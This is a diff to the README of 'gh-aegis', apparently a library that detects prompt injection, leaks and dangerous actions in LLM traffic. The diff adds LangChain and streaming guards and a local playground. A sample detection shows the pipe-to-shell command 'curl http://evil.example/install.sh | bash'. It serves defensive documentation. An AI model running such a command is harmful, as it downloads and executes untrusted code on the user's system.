@@ -24,8 +24,8 @@ if (!result.safe) throw new Error(`Blocked: ${result.threatType}`);
 - 🛡️ **8 OWASP families** — LLM01, LLM02, LLM04, LLM05, LLM06, LLM07, LLM08, LLM10 (see the [map](#owasp-llm-top-10-coverage)).
 - 🔒 **PII + secret redaction** — get a safe `sanitized` copy of model output.
 - 🧩 **Declarative policy** — toggle detectors/scopes/thresholds/redaction from a validated JSON file.
-- 🔌 **Drop-in adapters** — Express, Fastify, and the Vercel AI SDK.
-- 🖥️ **CLI** — `npx gh-aegis scan app.log`.
+- 🔌 **Drop-in integrations** — Express, Fastify, Vercel AI SDK, LangChain, and a streaming-output guard.
+- 🖥️ **CLI + playground** — `npx gh-aegis scan app.log`, plus a local zero-network eyeball demo.
 - 📊 **Reproducible benchmark** — `npm run bench` reports precision/recall/F1 over a committed dataset; CI fails on regressions.
 - 📦 **Zero runtime dependencies.**
 
@@ -190,6 +190,31 @@ const model = wrapLanguageModel({ model: yourModel, middleware: aegisMiddleware(
 // throws AegisBlockedError on a malicious prompt or a leaky completion
 ```
 
+**LangChain** — a callback handler (structurally compatible with `CallbackHandlerMethods`, **no
+`@langchain/*` dependency**) that scans prompts/messages (input), generations (output), and tool inputs:
+
+```ts
+import { aegisCallbackHandler } from "gh-aegis/langchain";
+
+await chain.invoke(input, { callbacks: [aegisCallbackHandler()] });
+// throws AegisBlockedError on a violation
+```
+
+### Streaming output
+
+Guard a token stream as it is produced — violations that straddle chunk boundaries (`<scr` + `ipt>`)
+are caught because the guard scans a sliding window of the accumulated output, and blocking is sticky:
+
+```ts
+import { guardTextStream } from "gh-aegis";
+
+for await (const chunk of guardTextStream(model.textStream)) {
+  process.stdout.write(chunk); // throws AegisBlockedError before emitting an unsafe chunk
+}
+```
+
+Or drive it manually with `createStreamGuard()` (`push(chunk)` / `end()` → `{ safe, blocked, result }`).
+
 ## CLI
 
 ```bash
@@ -207,6 +232,19 @@ cat transcript.txt | npx gh-aegis scan - --json
   line 41  [LLM08] EXCESSIVE_AGENCY (score 95) — Dangerous action detected: pipe-to-shell
     curl http://evil.example/install.sh | bash
 ```
+
+## Playground
+
+A local, **zero-network** page to paste text and watch detections + scores update live — the eyeball
+demo. It runs the real compiled library in your browser (no server, no telemetry):
+
+```bash
+npm run build
+open playground/index.html   # or: python3 -m http.server then visit /playground/
+```
+
+Type into the box (or click a sample) to see per-finding OWASP id, threat type, score, and the
+redacted `sanitized` output. The playground is in the repo only — it is **not** part of the npm package.
 
 ## `ScanResult`
 
@@ -313,7 +351,7 @@ Use gh-aegis as a deterministic first line of defense and layer it with:
 npm install
 npm run typecheck   # tsc --noEmit
 npm run lint        # eslint
-npm test            # vitest run (253 tests)
+npm test            # vitest run (276 tests)
 npm run bench       # benchmark + threshold gate
 npm run perf        # latency benchmark + p95 perf gate
 npm run build       # emit dist/ (ESM + .d.ts)
